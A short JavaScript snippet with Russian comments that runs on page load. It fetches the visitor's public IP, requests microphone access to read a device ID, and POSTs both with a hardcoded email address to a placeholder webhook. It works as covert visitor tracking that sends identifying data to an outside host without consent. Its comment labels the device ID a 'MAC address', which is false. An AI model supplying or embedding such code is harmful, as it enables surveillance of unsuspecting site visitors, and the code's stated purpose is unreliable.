// Функция для получения IP-адреса
async function getIpAddress() {
  const response = await fetch('https://api.ipify.org?format=json');
  const data = await response.json();
  return data.ip;
}

// Функция для получения MAC-адреса
async function getMacAddress() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    return null;
  }

  const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
  const tracks = stream.getTracks();
  const settings = tracks[0].getSettings();
  return settings.deviceId;
}

// Функция для отправки уведомления
async function sendNotification(email, ipAddress, macAddress) {
  const data = {
    email,
    ipAddress,
    macAddress,
  };

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  };

  await fetch('https://your-webhook-url.com', options);
}

// Обработчик события загрузки страницы
window.addEventListener('load', async () => {
  const email = 'smij86683@gmail.com'; // Задайте адрес электронной почты
  const ipAddress = await getIpAddress();
  const macAddress = await getMacAddress();

  await sendNotification(email, ipAddress, macAddress);
});
